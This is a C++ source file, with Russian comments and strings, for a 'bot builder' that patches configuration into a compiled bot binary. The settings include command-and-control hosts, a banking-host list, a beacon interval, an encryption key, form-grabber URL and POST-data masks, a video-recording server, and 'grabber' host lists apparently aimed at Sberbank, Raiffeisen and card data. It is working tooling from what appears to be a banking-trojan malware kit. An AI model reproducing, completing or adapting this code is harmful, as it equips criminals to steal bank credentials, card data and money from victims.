//---------------------------------------------------------------------------


#pragma hdrstop

#include "SysUtils.hpp"
#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"

#include "Config.h"
#include "Hunter.h"
#include "JavaConfig.h"
#include "VideoRecorder.h"
#include "FgrFilters.h"
#include "AzConfig.h"
#include "Sber.h"
#include "Rafa.h"
#include "cc.h"

//---------------------------------------------------------------------------

const PCHAR KeyForKey = "AUvS8jou0Z9K7Bf9";



PCHAR Error_UnknownMae = "Не указано имя";
PCHAR Error_MemAlloc = "Ошибка выделения памяти!";
PCHAR Error_NoSourceFile = "Исходный файл не открыт!";
PCHAR Error_BigParamDataSize = "Попытка прочитать слишком большой блок данных для параметра";
PCHAR Error_InvalidParamsFile = "Файл не фвляется файлом параметров или содержит ошибку!";
PCHAR Error_UnknownResultFileName = "Не указано имя конечного файла";
PCHAR Error_DataSizeError = "Попытка записать слишком большой блок данных";
PCHAR Error_BigPassword = "Слишком большой ключ шифрования";

PCHAR ParamStatus_Warning = "ПРЕДУПРЕЖДЕНИЕ: ";
PCHAR ParamStatus_Error   = "ОШИБКА:         ";

PCHAR StrNoParamValue = "Не установлено значение параметра \r\n --";

PCHAR ParamTitle_Hosts        = "Основные хосты бота";
PCHAR ParamTitle_BankHosts    = "Хосты режима BANKING";
PCHAR ParamTitle_Prefix       = "Префикс бота";
PCHAR ParamTitle_Delay        = "Интервал отстука";
PCHAR ParamTitle_Password     = "Ключ шифрования";



// UnicodeString Status_ = "";
UnicodeString Status_Ok = "OK";
UnicodeString Status_Error = "ОШИБКА";
UnicodeString Status_StartBuild = "Запуск сборки";
UnicodeString Status_CheckParams = "Проверяем параметры";
UnicodeString Status_WriteParams = "Записываем параметры:";
UnicodeString Status_WriteParam = "====> ";
UnicodeString Status_SaveFile = "Сохраняем файл ";
UnicodeString Status_BuildCompleted = "Сборка успешно завершена";

bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  функция упаковывает строки в одну строку. Каждая строка будет
	//  отделена нулевым символом. В конце последней строки будет стоять
	//  два нулевых символа. Пустые строки будут проигнорированы.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// Определяем длину буфера и удаляем пустые строки
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // Резервируем место для дополнительного нуля

	// Собираем данные
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(Error_MemAlloc);
    }

    PCHAR Tmp = OutBuf;

	// Копируем строки
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// Копируем строку
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			Decrypt(AnsiString(S).c_str(), Line);
		}
		else
			Line = AnsiString(S).c_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// Смещаем указатели
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// Добавляем дополнительный ноль
	*Tmp = 0;

	return true;
}


//****************************************************************************
//                             TBotBuilder
//****************************************************************************


#define BUILDER_FILE_SIGNATURE 0x91A3A08A /* BOT_BUILDER_FILE */

struct TBuilderFileHeader
{
	DWORD Signature;
	DWORD Version;
	DWORD Count;
};


__fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
	: TComponent(AOwner)
{
	FFile = new TMemoryStream();
	FParams = new TCollection(__classid(TBotParam));
	FModules = new TCollection(__classid(TBotModule));
	FActiveModules = new TList();

	// Добавляем основные параметры
	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
	FPassword  = new TBotPassword(this, true, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);


	// Hunter
	TBotModule* Module = AddModule(Module_BankHosts);
	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);



	FDelay->AsLong = DEFAULT_DELAY;

    InitializeModules();

}

__fastcall TBotBuilder::~TBotBuilder()
{
	delete FParams;
	delete FModules;
	delete FActiveModules;
	delete FFile;
}

// Функция загружает исходный файл
void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
{
	FFile->Size = 0;
	FSourceFileName = "";
	UpdateResultFileName(true);
	DeactivateModules();


	TFileStream* S = new TFileStream(FileName, fmOpenRead);
	try {
		FFile->LoadFromStream(S);
		FFile->Position = 0;
	} __finally {
		delete S;
	}



	FSourceFileName = FileName;
	UpdateResultFileName(false);
	ActivateModules();
}

//-----------------------------------------------------
// Build - Функция собирает сборку
//
// FullBuild  Параметр указывает, что собирается полная
//            сборка, при которой свойство параметров
//            Enabled будет игнорироваться
//-----------------------------------------------------
 bool __fastcall TBotBuilder::Build(bool FullBuild)
{
	if (FFile->Size == 0)
		throw Exception(Error_NoSourceFile);

    Message(Status_StartBuild);

	// Проверяем параметры
	Message(Status_CheckParams);

	TStringList* Errors = new TStringList();

	TBotParamStatus Status = CheckParams(Errors, FullBuild);

	UnicodeString ErrorText = Errors->Text;
    delete Errors;

	if (Status == psOk)
		Message(Status_Ok);
	else
	{
		Message(Errors);

		if (Status == psError)
            throw Exception(ErrorText);
    }


	if (FResultFileName.IsEmpty())
		throw Exception(Error_UnknownResultFileName);

	// Записываем

	TMemoryStream *Mem = new TMemoryStream();
	try {

		// Дублируем файл
		FFile->Position = 0;
		Mem->LoadFromStream(FFile);

		Mem->Position = 0;
		FFile->Position = 0;

        Message(Status_WriteParams);

		// Записываем параметры
		DWORD Count   = FParams->Count;
		PCHAR Buf     = (PCHAR)Mem->Memory;
		DWORD BufSize = Mem->Size;
		for (int i = 0; i < Count; i++)
		{
			TBotParam* Param = (TBotParam*)FParams->Items[i];

			if (Param->Active)
			{
				if ((FullBuild || Param->Enabled))
					WriteParametr(Buf, BufSize, Param);
				else
				{
					// Параметр отключен, забиваем его место нулями
					Param->WriteEmptyData(Buf, BufSize);
                }
			}
		}


		// Сохраняем файл
		Message(Status_SaveFile + FResultFileName);
		TFileStream *File = new TFileStream(FResultFileName, fmCreate);
		try {

			File->Write(Mem->Memory, Mem->Size);

		} __finally{
			delete File;
		}


	} __finally {
		delete Mem;
	}

	Message("");
    Message(Status_BuildCompleted);

	return true;
}
//-----------------------------------------------------------------

//-----------------------------------------------------------------
int __fastcall TBotBuilder::GetCount()
{
	return FParams->Count;
}
//-----------------------------------------------------------------

TBotParam* __fastcall TBotBuilder::GetParam(int Index)
{
	return (TBotParam*)FParams->Items[Index];
}
//-----------------------------------------------------------------

// Функция записывает данные в буфер
void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param)
{
    Message(Status_WriteParam + Param->DisplayName);
	bool Result = Param->Write(Buf, BufSize);
	if (Result)
		Message(Status_Ok);
	else
		Message(Status_Error);
}


// Функция проверяет состояние параметров
TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors, bool FullBuild)
{
	TBotParamStatus Result = psOk;

	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* Param = (TBotParam*)FParams->Items[i];
		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
		if (!UseParam) continue;

		TBotParamStatus Status = Param->Status();
		if (Status == psOk) continue;

		// Более высокое значение статуса означает
		// большую критичность состояния
		if (Status > Result)
			Result = Status;

		// Добавляем строку
		if (Errors)
		{
			UnicodeString Str;
			switch (Status) {
				case psWarning: Str = ParamStatus_Warning; break;
				case psError:   Str = ParamStatus_Error; break;
			}

			Str += StrNoParamValue;
			Str += Param->DisplayName;

			Errors->Add(Str);
        }
	}

	return Result;
}


// Функция вызывается после изменения значения параметра
void __fastcall TBotBuilder::ParamValueChanged(TBotParam* Sender)
{
	if (Sender == FPrefix)
	{
		// Сменился префикс, меняем имя результирующего файла
		UpdateResultFileName(false);
    }
}

// Функция собирает имя результирующего файла
void __fastcall TBotBuilder::UpdateResultFileName(bool Reset)
{
	// Сбрасываем настройки
	if (Reset)
	{
		FResultFileName = "";
		FResultFileNameChanged = false;
        return;
	}

	// Если имя файла задалось принудительно то выходим
	if (FResultFileNameChanged) return;

	if (FSourceFileName.IsEmpty() || FPrefix->IsEmpty())
	{
		// Префикс не установлен
		FResultFileName = "";
		return;
    }

	// Собираем имя
	UnicodeString Path = ExtractFilePath(FSourceFileName);
	UnicodeString Ext  = ExtractFileExt(FSourceFileName);

	FResultFileName = Path + FPrefix->AsUnicodeString + Ext;
}


void __fastcall TBotBuilder::ClearParams()
{
	// Функция очищает данные параметров
	for (int i = 0; i < FParams->Count; i++)
		((TBotParam*)FParams->Items[i])->Clear();
}


void __fastcall TBotBuilder::SaveToStream(TStream *Stream)
{

	// Записываем загоовок файла
	TBuilderFileHeader H;
	H.Signature = BUILDER_FILE_SIGNATURE;
	H.Version   = BUILDER_VERSION;
	H.Count     = FParams->Count;

	Stream->Write(&H, sizeof(H));

	// Записываем параметры
	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* P = (TBotParam*)FParams->Items[i];
		DWORD NameLen = P->FName.Length();

		// Записываем имя парамера
		Stream->Write(&NameLen, sizeof(NameLen));

		AnsiString Name = P->FName;
		Name.Unique();
		Decrypt(Name.c_str(), Name.c_str());

		Stream->Write(Name.c_str(), NameLen);

		// Записываем данные параметра
        P->SaveToStream(Stream);
	}
}


void __fastcall TBotBuilder::LoadFromStream(TStream *Stream)
{
	// Загружаем настройки из потока данных
	ClearParams();

	// Читаем заголовок
	TBuilderFileHeader H;

	int Readed = Stream->Read(&H, sizeof(H));

	// Проверяем правильность заголовка
	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
		throw Exception(Error_InvalidParamsFile);

    // Загружаем настройки параметров
	for (DWORD i = 0; i < H.Count; i++)
	{
		// Читаем имя параметра
		DWORD NameLen = 0;
		Stream->Read(&NameLen, sizeof(NameLen));

		AnsiString Name;
		Name.SetLength(NameLen);
		Readed = Stream->Read(Name.c_str(), NameLen);
		if (Readed != NameLen)
			throw Exception(Error_InvalidParamsFile);

		Decrypt(Name.c_str(), Name.c_str());

		// Читаем данные параметра
		TBotParam* Param = ParamByName(Name);
		if (Param)
			Param->LoadFromStream(Stream);
		else
		{
			// Параметр не найден, пропускаем блок
			DWORD Size = 0;
			Stream->Read(&Size, sizeof(Size));
			Stream->Position = Stream->Position + Size;
        }
	}

	UpdateResultFileName(false);
}


void __fastcall TBotBuilder::SaveToFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmCreate);
	try {

		SaveToStream(S);

	} __finally
	{
		delete S;
	}
}


void __fastcall TBotBuilder::LoadFromFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmOpenRead);
	try {

		LoadFromStream(S);

	} __finally
	{
		delete S;
	}
}


TBotParam* _fastcall TBotBuilder::ParamByName(const AnsiString &Name)
{
	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* P = (TBotParam*)FParams->Items[i];
		if (P->FName == Name)
			return P;
	}
	return NULL;
}


void __fastcall TBotBuilder::Message(const UnicodeString &Message)
{
	if (FOnMessage)
		FOnMessage(this, Message);
}


void __fastcall TBotBuilder::Message(TStrings *Messages)
{
	int Count = Messages->Count;
	for (DWORD i = 0; i < Count; i++)
		Message(Messages->Strings[i]);
}


TBotModule* __fastcall TBotBuilder::AddModule(const char *Name)
{
	return new TBotModule(this, Name);
}


void __fastcall TBotBuilder::ActivateModules()
{
	// Функция активирует необходимые модули
	int Count = FModules->Count;
	for (int i = 0; i < Count; i++)
	{
		TBotModule* Module = (TBotModule*)FModules->Items[i];
		if (Module->Activate((PCHAR)FFile->Memory, FFile->Size))
        	FActiveModules->Add(Module);
	}
}


void __fastcall TBotBuilder::DeactivateModules()
{
	// Функция деактивирует модули
	for (int i = FActiveModules->Count - 1; i >= 0; i--)
	{
		TBotModule* Module = (TBotModule*)FActiveModules->Items[i];
		Module->FActive = false;
		FActiveModules->Delete(i);
	}

}

int __fastcall TBotBuilder::GetActiveModulesCount()
{
	return FActiveModules->Count;
}


TBotModule* __fastcall TBotBuilder::GetActiveModules(int Index)
{
	return (TBotModule*)FActiveModules->Items[Index];
}


void __fastcall TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
{
	TBotModule* Module = ModuleByName(Name);
	if (Module)
        Module->FEdit = Edit;
}


TBotModule*__fastcall TBotBuilder::ModuleByName(const UnicodeString &Name)
{
    int Count = FModules->Count;
	for (int i = 0; i < Count; i++)
	{
		TBotModule* Module = (TBotModule*)FModules->Items[i];
		if (Module->Name == Name)
			return Module;
	}

	return NULL;
}



//-----------------------------------------------------------------------------
//                  Инициализация модулей бота
//-----------------------------------------------------------------------------


void __fastcall TBotBuilder::InitializeModules()
{
	TBotModule* Module;


    // Hunter
	Module = AddModule(Module_Hunter);
    Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "Ссылки модуля Hunter");

    // Настройки формграбера
	Module = AddModule(Module_FormGraber);
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "Ссылки формграбера");
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "Маски пост данных");

	// Видеорекордер
	Module = AddModule(Module_VideoRecorder);
	Module->AddParam(true,  VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №1");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №2");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_URLS, VIDEOREC_PARAM_NAME_URLS,  VIDEOREC_PARAM_SIZE_URLS, "Адреса старта записиси видео");

	// JAVA Config
	Module = AddModule(Module_JavaConfig);
	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "Ссылки JAVA");

	// Ccskrb AZ
	Module = AddModule(Module_AzConfig);
	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");

	// Настройки грабера сбер
	Module = AddModule(Module_SberHosts);
	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");


	Module = AddModule(Module_RafaHosts);
	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");

	Module = AddModule(Module_CCHosts);
	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
}



//****************************************************************************
//                             TBotParam
//****************************************************************************
__fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted,
	const char* Name, DWORD Size, const char* Title)
	: TCollectionItem(AOwner->FParams)
{
	if (STRA::IsEmpty(Name))
		throw Exception("Unknown param name!");

	if (Size == 0)
		throw Exception("Unknown param size!");

	FEnabled = true;
	FEncrypted = Encrypted;
	FOwner = AOwner;
	FTitle = Title;
	FName = Name;
	FNotNull = NotNull;
	// Так как большинство параметров являются строковыми, то
	// размер буфера устанавливаем с учётом завершающего нуля
	FSize = Size - 1;
	FDataSize = 0;
	FDataSize = 0;
	FData = (PCHAR)malloc(FSize);
	if (!FData)
		throw Exception(Error_MemAlloc);

    m_memset(FData, 0, FSize);
}


__fastcall TBotParam::~TBotParam()
{
	free(FData);
	if (FModule)
		FModule->FParams->Remove(this);
}

bool __fastcall TBotParam::GetActive()
{
	return FModule == NULL || FModule->Active;
}

// Функция возвращает состояние парметра
TBotParamStatus __fastcall TBotParam::Status()
{
	if (FModule && !FModule->Active)
		return psOk;

	if (IsEmpty())
	{
		if (FNotNull)
			return psError;
		else
			return psWarning;
	}
	return psOk;
}


// Функция возвращает отображаемое имя параметра
UnicodeString __fastcall TBotParam::GetDisplayName(void)
{
	if (FTitle.IsEmpty())
		return FName;
	else
		return FTitle;
}

// Функция возвращает истину если параметр пустой
bool __fastcall TBotParam::IsEmpty()
{
	return FDataSize == 0;
}

// Функция очищает параметр
void __fastcall TBotParam::Clear()
{
	FDataSize = 0;
	m_memset(FData, 0, FSize);
}


// Функция устанавливает значение параметра
void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
{
	Clear();

	if (Value && !ValueSize)
		ValueSize = STRA::Length(Value);

	if (ValueSize > FSize)
		throw Exception(Error_DataSizeError);

	if (Value && ValueSize)
	{
		m_memcpy(FData, Value, ValueSize);
		FDataSize = ValueSize;
		if (FEncrypted)
            Decrypt(FData, FData);
	}

	Changed();
}


void __fastcall TBotParam::DoChanged()
{

}

void __fastcall TBotParam::Changed()
{
	DoChanged();
	FOwner->ParamValueChanged(this);
}


AnsiString __fastcall TBotParam::GetAsAnsiString()
{
	AnsiString S = FData;
	if (FEncrypted)
		Decrypt(S.c_str(), S.c_str());
	return S;
}

void __fastcall TBotParam::SetAsAnsiString(const AnsiString &Value)
{
    SetValue(Value.c_str(), Value.Length());
}


UnicodeString __fastcall TBotParam::GetAsUnicodeString()
{
	return AsAnsiString;
}

void __fastcall TBotParam::SetAsUnicodeString(const UnicodeString &Value)
{
	AsAnsiString = Value;
}

DWORD __fastcall TBotParam::GetAsLong()
{
	int Result = 0;
	if (FDataSize)
		TryStrToInt(AsUnicodeString, Result);
	return Result;
}

void __fastcall TBotParam::SetAsLong(DWORD Value)
{
	AnsiString S(Value);
	SetValue(S.c_str(), S.Length());
}


void __fastcall TBotParam::SaveToStream(TStream *Stream)
{
	// Функция сохраняет данные в поток
	Stream->Write(&FDataSize, sizeof(FDataSize));
	if (FDataSize)
		Stream->Write(FData, FDataSize);

}

void __fastcall TBotParam::LoadFromStream(TStream *Stream)
{
	// Функция загружает данные из потока
	Clear();
	DWORD Size = 0;
	Stream->Read(&Size, sizeof(Size));

	if (Size > FSize)
		throw Exception(Error_BigParamDataSize);

	if (Size)
	{
		FDataSize = Size;
		Stream->Read(FData, Size);
    }
}


UnicodeString __fastcall TBotParam::GetAsStrings()
{
	// Функция возвращает многострочный текст
	if (FDataSize == 0)
		return "";

	TStringList *S = new TStringList();

	SaveToStrings(S);

	UnicodeString R = S->Text;
	delete S;
	return R;

}


void __fastcall TBotParam::SetAsStrings(const UnicodeString &Value)
{
	if (Value.Length() == 0)
	{
		Clear();
		return;
	}

	TStringList *S = new TStringList();
	S->Text = Value;

	LoadFromStrings(S);

	delete S;
}

void __fastcall TBotParam::SaveToStrings(TStrings *Strings)
{
	// Функция созраняет данные в набор строк,
	// Подразумевается, что данные это набор строк разделённых нулём
	Strings->Clear();
	Strings->BeginUpdate();
	try {


		if (FDataSize)
		{
			TStrEnum E(FData, FEncrypted, 0);
			while (E.Next())
			{
				Strings->Add(E.Line().t_str());
			}
		}

	} __finally {
		Strings->EndUpdate();
	}

}

void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
{
	// Функция данные данные из набора строк,
	// Подразумевается, что данные это набор строк разделённых нулём
	Clear();

	int Count = Strings->Count;

    PCHAR Buf = FData;

	for (int i = 0; i < Count; i++)
	{
		AnsiString S = Strings->Strings[i].Trim();
		DWORD Len = S.Length();
		if (Len == 0) continue;

		Len++;// Цепляем ноль в конце

		// Проверяем помещается ли наша строка
		if (FDataSize + Len >= FSize)
			return;

		// При необходимости шифруем строку
		if (FEncrypted)
			Decrypt(S.c_str(), S.c_str());

		// Копируем данные
		m_memcpy(Buf, S.c_str(), Len);

		Buf += Len;
		FDataSize += Len;
	}
}


bool __fastcall TBotParam::Write(PCHAR Buf, DWORD BufSize)
{
	// Функция записывает своё значение в буфер
	return DoWrite(Buf, BufSize, FData, FSize);
}

bool __fastcall TBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
{
	// Функция заполняет нулями своё место в сборке
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	m_memset(Buf + Pos, 0, FSize);
	return true;
}


int  __fastcall TBotParam::Position(PCHAR Buf, DWORD BufSize)
{
	// Функция возвращает позицию параметра в буфере
	return STR::Pos(Buf, FName.c_str(), BufSize);
}


bool __fastcall TBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
{
	// Ищем позицию
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	// записываем данные
	m_memcpy(Buf + Pos, AData, ADataSize);
	return true;
}


//****************************************************************************
//                             TBotPassword
//****************************************************************************

__fastcall TBotPassword::TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)

	// Вызываем оригинальный конструктор но учитываем то, что
	// передаваемое значение будет закодировано и будет в BASE64
	// кодировке. Резервируем буфер с запасом, но перекроем запись
	// данных в бота
	: TBotParam(AOwner, NotNull, Encrypted, Name, Size * 3 + 128, Title)

{
	FRealSize = Size;
}



bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
{
	// Перед записью ключа расшифровываем его;
	AnsiString Key;
	Key.SetLength(FRealSize);

	// Расшифровываем данные
	if (!IsEmpty())
	{

		PCHAR Str = STR::New(AsAnsiString.c_str());
		DWORD Size = 0;
		RC2Crypt::Decode(KeyForKey, Str, Size);
		if (Size >= FRealSize)
			throw Exception(Error_BigPassword);

        m_memset(Key.c_str(), 0, FRealSize);
		m_memcpy(Key.c_str(), Str, Size);

		if (Encrypted)
			Decrypt(Key.c_str(), Key.c_str());
    }

    DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
}


bool __fastcall TBotPassword::WriteEmptyData(PCHAR Buf, DWORD BufSize)
{
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	m_memset(Buf + Pos, 0, FRealSize);
	return true;
}

//****************************************************************************
//                             TBotModule
//****************************************************************************
__fastcall TBotModule::TBotModule(TBotBuilder* AOwner, const char *Name)
	: TCollectionItem(AOwner->FModules)
{
	if (STRA::IsEmpty(Name))
		throw Exception(Error_UnknownMae);

    FBuilder = AOwner;
	FName = Name;
	FParams = new TList();
}


__fastcall TBotModule::~TBotModule()
{
	delete FParams;
}


TBotParam* __fastcall TBotModule::AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
{
	TBotParam* Param = new TBotParam(FBuilder, NotNull, Encrypted, Name, Size, Title);
	FParams->Add(Param);
	Param->FModule = this;
    return Param;
}

bool __fastcall TBotModule::CanEdit()
{
	return FParams->Count && FEdit;
}


bool __fastcall TBotModule::Edit()
{
	if (FEdit)
		return FEdit->Execute(this);
}


bool __fastcall TBotModule::Activate(PCHAR Buf, DWORD BufSize)
{
	// Функция активирует модуль
	FActive = false;
	for (int i = 0; i < ParamsCount; i++)
	{
		if (Params[i]->Position(Buf, BufSize) >= 0)
		{
			FActive = true;
			return true;
        }
	}

	return false;
}


int __fastcall TBotModule::GetParamsCount()
{
	return FParams->Count;
}

TBotParam* __fastcall TBotModule::GetParams(int Index)
{
	return (TBotParam*)FParams->Items[Index];
}


TBotParam* __fastcall TBotModule::ParamByName(const AnsiString &Name)
{
	// Функция возвращает параметр по его имени
	for (int i = 0; i < ParamsCount; i++)
	{
		TBotParam *P = Params[i];
		if (P->FName == Name)
		{
			return P;
        }
	}

	return NULL;
}
